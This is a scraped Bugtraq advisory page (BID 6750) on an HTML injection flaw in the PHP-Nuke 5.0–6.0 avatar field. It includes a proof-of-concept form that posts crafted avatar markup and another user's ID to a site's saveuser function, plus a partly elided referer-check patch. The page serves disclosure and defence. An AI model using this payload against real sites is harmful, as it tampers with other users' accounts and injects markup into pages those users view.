#SpeeDr00t@Black Falcon<br>#bid6750<p><b><span style="font-size: 18pt;">PHP-Nuke Avatar HTML Injection Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/6750/info">info</a><br><a href="http://www.securityfocus.com/bid/6750/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/6750/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/6750/solution">solution</a><br><a href="http://www.securityfocus.com/bid/6750/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				6750
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Input Validation Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Feb 03 2003 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Feb 03 2003 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				Vulnerability discovery credited to "delusion" &lt;delusi0n@bellsouth.net&gt;.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Francisco Burzi PHP-Nuke 6.0 <br/>
					
				
					Francisco Burzi PHP-Nuke 5.6 <br/>
					
				
					Francisco Burzi PHP-Nuke 5.5 <br/>
					
				
					Francisco Burzi PHP-Nuke 5.4 <br/>
					
				
					Francisco Burzi PHP-Nuke 5.3.1 <br/>
					
				
					Francisco Burzi PHP-Nuke 5.2 a<br/>
					
				
					Francisco Burzi PHP-Nuke 5.2 <br/>
					
				
					Francisco Burzi PHP-Nuke 5.1 <br/>
					
				
					Francisco Burzi PHP-Nuke 5.0.1 <br/>
					
				
					Francisco Burzi PHP-Nuke 5.0 <br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	This vulnerability may be exploited using a standard web browser.<br/><br/>The following code is proof of concept was provided by  "delusion" &lt;delusi0n@bellsouth.net&gt; :<br/><br/>&lt;!-- START CODE --!&gt;<br/>&lt;form name="Register"<br/>action="http://NUKEDSITE/modules.php?name=Your_Account" method="post"&gt;<br/><br/>&lt;b&gt;Code ('"&gt;code&lt;b ')&lt;/b&gt;&lt;input type="text" name="user_avatar" size="30"<br/>maxlength="30"&gt;&lt;br&gt;&lt;br&gt;<br/><br/>&lt;b&gt;Username&lt;/b&gt;&lt;input type="text" name="uname" size="30"<br/>maxlength="255"&gt;&lt;br&gt;&lt;b&gt;User ID:&lt;input type="text" name="uid"<br/>size="30"&gt;&lt;input type="hidden" name="op" value="saveuser"&gt;&lt;input<br/>type="submit" value="Save Changes"&gt;&lt;/form&gt;<br/>&lt;!-- END CODE --!&gt;<br/><br/><br/>To modify other users avatar information:<br/><br/>Search for "saveuser" you should get to a function that looks like this..<br/><br/>function saveuser($uid, $realname, $uname, $email, etc...<br/><br/>right underneath the function call, put this in..<br/><br/>$referer = getenv("HTTP_REFERER");<br/>$nukeurl="http://digital-delusions.com";<br/>$nukeurl2="http://digital-delusions.dyn.ee";<br/>$nukeurl3="http://192.168.0.254";<br/>if (substr("$referer",0,strlen($nukeurl))==$nukeurl OR<br/>substr("$referer",0,strlen($nukeurl2))==$nukeurl2 OR<br/>substr("$referer",0,strlen($nukeurl3))==$nukeurl3) {<br/><br/> make sure u change my URLs to your site's urls.<br/><br/> ... <br/><br/>      Header("Location: modules.php?name=$module_name");<br/>            }<br/>     }<br/>}<br/><br/>before the last "}" paste this..<br/><br/>} else {<br/>echo "delusion ownz j00";<br/>}
	
		<ul>
</ul>
</div>